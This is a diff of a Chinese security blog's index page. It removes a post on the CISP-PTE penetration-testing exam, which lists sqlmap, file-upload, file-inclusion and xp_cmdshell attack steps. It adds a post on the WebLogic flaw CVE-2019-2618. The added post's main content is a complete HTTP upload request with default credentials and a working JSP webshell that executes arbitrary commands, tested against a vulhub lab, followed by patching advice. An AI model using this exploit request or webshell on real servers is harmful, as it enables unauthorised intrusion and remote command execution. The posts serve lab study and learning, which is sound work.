@@ -53,7 +53,7 @@
 
     
       
-        <article id="post-Talking About CISP PTE" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+        <article id="post-CVE-2019-2618" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
 
   <div class="article-inner">
     
@@ -61,7 +61,7 @@
         
   
     <h2 itemprop="name">
-      <a class="article-title" href="/post/fd616792.html">Talking About CISP PTE</a>
+      <a class="article-title" href="/post/c468c7fd.html">CVE-2019-2618</a>
     </h2>
   
 
@@ -70,8 +70,8 @@
 
     
       <div class="article-meta">
-        <a href="/post/fd616792.html" class="article-date">
-  <time datetime="2019-04-17T15:50:34.000Z" itemprop="datePublished">2019-04-17</time>
+        <a href="/post/c468c7fd.html" class="article-date">
+  <time datetime="2019-04-18T13:10:13.000Z" itemprop="datePublished">2019-04-18</time>
 </a>
         
       </div>
@@ -83,70 +83,45 @@
       
 
       
-        <p><a href="https://imgchr.com/i/EX0DQH" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/05/19/EX0DQH.jpg" alt="EX0DQH.jpg"></a></p>
-<h2 id="CISP-PTE-介绍"><a href="#CISP-PTE-介绍" class="headerlink" title="CISP PTE 介绍"></a>CISP PTE 介绍</h2><p>注册信息安全专业人员-渗透测试，英文为 Certified Information Security Professional – Penetration Test Engineer ，简称 CISP-PTE。证书持有人员主要从事信息安全技术领域网站渗透测试工作，具有规划测试方案、 编写项目测试计划、编写测试用例、测试报告的基本知识和能力。</p>
-<h2 id="CISP-PTE-考试模式"><a href="#CISP-PTE-考试模式" class="headerlink" title="CISP PTE 考试模式"></a>CISP PTE 考试模式</h2><ol>
-<li>考试时间： 4个小时/240分钟</li>
-<li>考试模式： 上机操作</li>
-<li>考试机系统： windows server 2003</li>
+        <p><img src="https://s2.ax1x.com/2019/05/19/EXaxld.jpg" alt="EXaxld.jpg"></p>
+<h2 id="漏洞-介绍"><a href="#漏洞-介绍" class="headerlink" title="漏洞-介绍"></a>漏洞-介绍</h2><p>CVE-2019-2618 文件上传</p>
+<p>CVE-2019-1615任意文件读取</p>
+<p>PS :这两个漏洞都需要OAM认证，也就是需要账号密码；之后weblogic正常deploy 本身就可以部署war文件，就像上传shell一样，，，咳咳</p>
+<h2 id="漏洞-影响版本"><a href="#漏洞-影响版本" class="headerlink" title="漏洞-影响版本"></a>漏洞-影响版本</h2><p>Oracle WebLogic Server：</p>
+<ul>
+<li>10.3.6.0.0</li>
+<li>12.1.3.0.0</li>
+<li>12.2.1.3.0</li>
+</ul>
+<h2 id="漏洞-环境搭建"><a href="#漏洞-环境搭建" class="headerlink" title="漏洞-环境搭建"></a>漏洞-环境搭建</h2><p>用的<a href="https://vulhub.org/" target="_blank" rel="noopener">vulhub</a> CVE-2017-10271 两者影响版本差不多</p>
+<p><img src="https://s2.ax1x.com/2019/04/18/EpC3cT.md.png" alt></p>
+<p><img src="https://s2.ax1x.com/2019/05/18/EOldQU.png" alt="EOldQU.png"></p>
+<h2 id="漏洞-验证"><a href="#漏洞-验证" class="headerlink" title="漏洞-验证"></a>漏洞-验证</h2><p>前提：weblogic弱密码，可猜解；vulhub默认密码：weblogic/Oracle@123</p>
+<p>上传地址随便找了一个../tmp/_WL_internal/bea_wls_deployment_internal/gyuitk/war</p>
+<p>抓包改包</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">POST /bea_wls_deployment_internal/DeploymentService HTTP/1.1</span><br><span class="line">Host:192.168.32.140:7001</span><br><span class="line">Connection: close</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">User-Agent: python-requests/2.21.0</span><br><span class="line">username: weblogic</span><br><span class="line">wl_request_type: app_upload</span><br><span class="line">cache-control: no-cache</span><br><span class="line">wl_upload_application_name:../tmp/_WL_internal/bea_wls_deployment_internal/gyuitk/war</span><br><span class="line">serverName: weblogic</span><br><span class="line">password: Oracle@123</span><br><span class="line">content-type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW</span><br><span class="line">archive: true</span><br><span class="line">server_version: 10.3.6.0</span><br><span class="line">wl_upload_delta: true</span><br><span class="line">Content-Length: 605</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary7MA4YWxkTrZu0gW</span><br><span class="line">Content-Disposition: form-data; name=&quot;shell.jsp&quot;; filename=&quot;webshell.jsp&quot;</span><br><span class="line">Content-Type: false</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    if(&quot;123&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123;</span><br><span class="line">        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;)).getInputStream();</span><br><span class="line">        int a = -1;          </span><br><span class="line">        byte[] b = new byte[1024];          </span><br><span class="line">        out.print(&quot;&lt;pre&gt;&quot;);          </span><br><span class="line">        while((a=in.read(b))!=-1)&#123;</span><br><span class="line">            out.println(new String(b));          </span><br><span class="line">        &#125;</span><br><span class="line">        out.print(&quot;&lt;/pre&gt;&quot;);</span><br><span class="line">    &#125; </span><br><span class="line">    %&gt;</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary7MA4YWxkTrZu0gW--</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.ax1x.com/2019/05/18/EOG091.png" alt="EOG091.png"></p>
+<p>访问shell</p>
+<p><a href="https://imgchr.com/i/EOG6BD" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/05/18/EOG6BD.png" alt="EOG6BD.png"></a></p>
+<h2 id="漏洞-修复建议"><a href="#漏洞-修复建议" class="headerlink" title="漏洞-修复建议"></a>漏洞-修复建议</h2><ul>
+<li>升级补丁</li>
+<li>如果不依赖T3协议进行JVM通信，禁用T3协议。</li>
+</ul>
+<p>升级补丁</p>
+<p>Oracle官方更新链接地址：<a href="https://www.oracle.com/technetwork/security-advisory/cpuapr2019-5072813.html" target="_blank" rel="noopener">https://www.oracle.com/technetwork/security-advisory/cpuapr2019-5072813.html</a></p>
+<p>禁用T3协议</p>
+<ol>
+<li>进入WebLogic控制台，在base_domain配置页面中，进入安全选项卡页面，点击筛选器，配置筛选器。</li>
+<li>在连接筛选器中输入：weblogic.security.net.ConnectionFilterImpl，在连接筛选器规则框中输入* * 7001 deny t3 t3s</li>
+<li>保存生效（无需重启）</li>
 </ol>
-<h2 id="CISP-PTE-题型"><a href="#CISP-PTE-题型" class="headerlink" title="CISP PTE 题型"></a>CISP PTE 题型</h2><ul>
-<li>选择题【20分 20道】</li>
-<li>实验题【50分 5道 5个key】 </li>
-<li>综合题【30分 1道 3个key】</li>
-<li>分值占比</li>
-</ul>
-<p><img src="https://s2.ax1x.com/2019/04/11/A72JAA.png" alt></p>
-<h2 id="CISP-PTE-大纲"><a href="#CISP-PTE-大纲" class="headerlink" title="CISP PTE 大纲"></a>CISP PTE 大纲</h2><p><img src="https://s2.ax1x.com/2019/04/11/A72K1K.png" alt></p>
-<h2 id="CISP-PTE-经验"><a href="#CISP-PTE-经验" class="headerlink" title="CISP PTE 经验"></a>CISP PTE 经验</h2><h3 id="选择题"><a href="#选择题" class="headerlink" title="选择题"></a>选择题</h3><ul>
-<li>看经验，看基础，加密、密码学相关的也会考点儿</li>
-</ul>
-<h3 id="实验题"><a href="#实验题" class="headerlink" title="实验题"></a>实验题</h3><ul>
-<li><p>第一题：一般是sql注入，考的是sqlmap用法</p>
-<p>  举例：slqmap -u “<a href="http://www.baidu.com&quot;" target="_blank" rel="noopener">www.baidu.com&quot;</a> –dbs –batch –level 5 –risk 3 –tamper=space2plus</p>
-</li>
-<li><p>第二题：文件上传，考的是黑名单绕过，文件头绕过或者MIME绕过等等</p>
-<p>  举例：我在考试的时候比较特殊，过滤了eval等参数；我直接用<?php readfile("../key.php");?>和图片合成一句话木马，上传时用burp修改文件后缀为php3 ，菜刀链接就好<br>  或者file_get_contents 读文件</p>
-</li>
-<li><p>第三题：文件包含，伪协议</p>
-<p>  举例：php://filter/read=convert.base64-encode/resource=;</p>
-</li>
-<li><p>第四题：爆破</p>
-<p>  举例：burp intruder用法</p>
-</li>
-<li><p>第五题：日志分析，白送</p>
-<p>  举例：ctrl+f 搜索关键状态码 200 之类的；或者get get 突然 post 的日志</p>
-</li>
-</ul>
-<h3 id="综合题"><a href="#综合题" class="headerlink" title="综合题"></a>综合题</h3><ul>
-<li>大概思路是=&gt;nmap 扫描端口=&gt;御剑扫目录=&gt;找到登录框爆破=&gt;分析zip网站备份文件=&gt;连接数据库=&gt;开启XP_CMDSHELL=&gt;关闭防火墙，加用户或者写shell，lcx端口转发=&gt;mstsc连接主机</li>
-<li>综合题一共三个key,第一个在登录框处；第二个在连到数据库的数据库列表里面；第三个在远程主机桌面上</li>
-</ul>
-<h2 id="实战举例"><a href="#实战举例" class="headerlink" title="实战举例"></a>实战举例</h2><ul>
-<li><p>sql注入  </p>
-<p>ps:我用的payload，参数不一定都是有用的，只是习惯了</p>
-<p><img src="https://s2.ax1x.com/2019/04/12/AqnlEn.png" alt></p>
-<p><img src="https://s2.ax1x.com/2019/04/12/Aqndb9.png" alt></p>
-</li>
-<li><p>命令执行 </p>
-<p>ps:grep用好！！！</p>
-<p><img src="https://s2.ax1x.com/2019/04/12/AquGdA.png" alt></p>
-</li>
-<li><p>文件包含</p>
-<p>ps:因为是要获取key值，所以凡是能带出数据的协议都值得背下来</p>
-<p><img src="https://s2.ax1x.com/2019/04/12/AquXQO.png" alt></p>
-</li>
-</ul>
-<h2 id="CISP-PTE-学习链接"><a href="#CISP-PTE-学习链接" class="headerlink" title="CISP PTE 学习链接"></a>CISP PTE 学习链接</h2><ol>
-<li>漏洞银行第86期[B站搜】</li>
-<li><a href="http://zgao.top/2018/06/" target="_blank" rel="noopener">http://zgao.top/2018/06/</a></li>
-<li>web安全深度剖析【刷完】</li>
-</ol>
+<p><strong>注：转载请注明出处:lilifengcode.github.io</strong></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://lilifengcode.github.io/post/fd616792.html" data-id="cjy9usdlg0007s4t7kmvsthnh"
+      <a data-url="http://lilifengcode.github.io/post/c468c7fd.html" data-id="ck00epjxc00043ot727veut3t"
          class="article-share-link">分享</a>
       
     </footer>
@@ -167,7 +142,7 @@
   
     <nav class="page-nav">
       
-      <a class="extend prev" rel="prev" href="/page/4/">上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><a class="page-number" href="/page/7/">7</a><span class="space">&hellip;</span><a class="page-number" href="/page/22/">22</a><a class="extend next" rel="next" href="/page/6/">下一页</a>
+      <a class="extend prev" rel="prev" href="/page/4/">上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><a class="page-number" href="/page/7/">7</a><span class="space">&hellip;</span><a class="page-number" href="/page/23/">23</a><a class="extend next" rel="next" href="/page/6/">下一页</a>
     </nav>
   
 </section>
